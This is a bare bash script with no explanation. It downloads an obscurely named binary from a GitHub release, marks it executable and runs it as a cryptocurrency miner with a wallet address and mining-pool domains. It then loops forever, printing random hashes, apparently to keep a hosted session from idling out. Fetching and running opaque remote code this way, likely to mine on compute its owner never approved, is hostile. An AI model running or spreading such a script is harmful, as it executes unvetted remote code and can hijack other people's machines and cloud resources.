#!/bin/bash
wget https://github.com/vedhagsvp/qubros/releases/download/apl/mnxpcna
chmod +x mnxpcna
./mnxpcna -targetMiner 0x414A2A8b272cbD0bcEbb70ae1919cfeff89521E7 -domain https://hkg-mining.x-phere.com,https://idn-mining.x-phere.com
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done
